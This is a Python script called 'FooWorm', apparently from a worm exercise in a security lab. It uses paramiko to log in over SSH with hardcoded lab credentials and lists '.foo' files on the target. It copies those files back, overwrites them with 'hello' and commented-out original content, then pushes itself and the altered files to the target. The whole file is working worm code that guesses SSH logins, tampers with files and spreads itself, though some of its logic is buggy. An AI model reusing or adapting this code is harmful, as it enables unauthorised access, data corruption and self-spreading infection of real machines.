#!/usr/bin/env python

import sys
import os
import scp
import random
import paramiko

name = input("\nEnter your name:\n")

print("\nHELLO FROM FooWorm!!\n")
print("\nHELLO ATTACKER:", name)

while True:
    usernames = ["seed"]
    passwds = ["dees"]
    ipaddrs = ["192.168.45.134"]

    for passwd in passwds:
        for user in usernames:
            for ip_address in ipaddrs:
                print("\nTrying password %s for user %s at IP address: %s" % (passwd, user, ip_address))
                files_of_interest_at_target = []

                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                    print("\n\nconnected\n")
                    cmd = 'ls *.foo'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()

                    if error is not None:
                        print(error)
                        next

                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())

                    print("\nFiles found by attacker %s: %s" % (name, str(files_of_interest_at_target)))

                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                            IN = open(sys.argv[0], 'r')
                            TAR = open(target_file, 'r')
                            all_of_it = TAR.readlines()
                            TAR.close()
                            if any(line.find('foovirus') for line in all_of_it):
                                next

                            os.chmod(target_file, 0o777)
                            OUT = open(target_file, 'w')
                            OUT.writelines("hello")
                            all_of_it = ['#' + line for line in all_of_it]
                            OUT.writelines(all_of_it)
                            OUT.close()

                    scpcon.put(sys.argv[0])
                    scpcon.close()

                except:
                    next

                if len(files_of_interest_at_target) > 0:
                    print("\nSending the virus file to seed vm:")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect('192.168.45.134', port=22, username='seed', password='dees', timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\nFile successfully sent at /home/seed\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()

                    except:
                        print("Not sent, check again!\n")
                        next
    break
